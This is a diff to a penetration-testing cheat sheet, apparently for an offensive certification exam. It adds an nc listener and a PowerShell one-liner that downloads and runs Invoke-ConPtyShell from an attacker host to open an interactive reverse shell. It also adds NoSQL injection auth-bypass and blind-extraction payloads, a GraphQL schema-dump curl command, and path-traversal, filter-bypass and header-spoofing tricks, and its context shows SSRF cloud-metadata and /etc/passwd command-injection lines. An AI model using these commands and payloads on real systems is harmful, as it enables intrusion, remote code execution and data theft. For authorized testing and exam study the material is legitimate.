@@ -48,6 +48,19 @@ stty size            # on your box -> get rows/cols
 stty rows 50 cols 200   # in the shell
 ```
 
+### Fully-interactive Windows shell (ConPtyShell — the Windows `stty` trick)
+Upgrade a dumb Windows shell to a real PTY (tab, history, working Ctrl-C):
+```bash
+# On your box: raw the terminal so keystrokes pass through, note your size, then listen
+stty raw -echo; (stty size)          # -> e.g. 50 200
+nc -lvnp 443
+```
+```powershell
+# On target (from the initial dumb shell):
+IEX(IWR http://LHOST/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST 443 200 50
+# reset your terminal afterwards:  stty sane / reset
+```
+
 ### msfvenom payloads (NOT counted as Metasploit usage)
 ```bash
 # Windows exe reverse shell
@@ -162,6 +175,29 @@ $(id)       `id`        %0a id (newline)
 cat${IFS}/etc/passwd
 ```
 
+### NoSQL injection (Mongo-backed apps)
+```
+# Auth bypass — JSON body:  {"user":{"$ne":null},"pass":{"$ne":null}}
+# URL params:               user[$ne]=x&pass[$ne]=x   |   user[$regex]=^admin
+# Blind exfil, char by char: pass[$regex]=^a  ->  ^ab  ->  ...
+# JS eval sinks: '"><script> or  ';return true;var _='   (operator/$where injection)
+```
+
+### GraphQL
+```bash
+# Introspection is often left on — dump the whole schema:
+curl -s http://$IP/graphql -H 'Content-Type: application/json' \
+  -d '{"query":"{__schema{types{name fields{name}}}}"}'
+# Then query hidden types/fields; resolvers frequently skip authz -> IDOR / data leak.
+# Also check /graphiql, /v1/graphql, batch queries (send an array of ops).
+```
+
+### Path / auth-filter bypass quickies
+- **Tomcat/Spring** path filter bypass: `..;/` segment — `/app/..;/manager/html`, `/;/admin`.
+- **Nginx alias traversal:** `location /x` mapped to `alias /y/` → `/x../` escapes the dir.
+- **`../` filtered:** try `%2e%2e%2f`, `..%2f`, `....//`, or double-encode `%252e%252e%252f`.
+- **Reverse-proxy trust:** spoof `X-Forwarded-For: 127.0.0.1` / `X-Original-URL` / `X-Rewrite-URL` to reach admin-only paths.
+
 ### SSRF (DevArea / Apache CXF pattern)
 - Hit internal services: `http://127.0.0.1:port`, cloud metadata `http://169.254.169.254/...`.
 - Bypass filters: `http://127.1`, `http://0`, decimal/hex IP, `http://localhost`, DNS rebinding, `@` tricks `http://allowed@127.0.0.1`.
@@ -266,6 +302,6 @@ gcc -m32 exploit.c -o exploit             # 32-bit on 64-bit Kali (needs gcc-mul
 # ALWAYS read & adjust offsets/RHOST/LHOST/shellcode before running.
 ```
 
-Sources to cache offline before exam: exploit-db, GitHub PoCs, HackTricks, GTFOBins, LOLBAS, PayloadsAllTheThings. (No AI during exam — these are your lifelines.)
+Cache offline before the exam: exploit-db, GitHub PoCs, HackTricks, GTFOBins, LOLBAS, PayloadsAllTheThings.
 
 ---
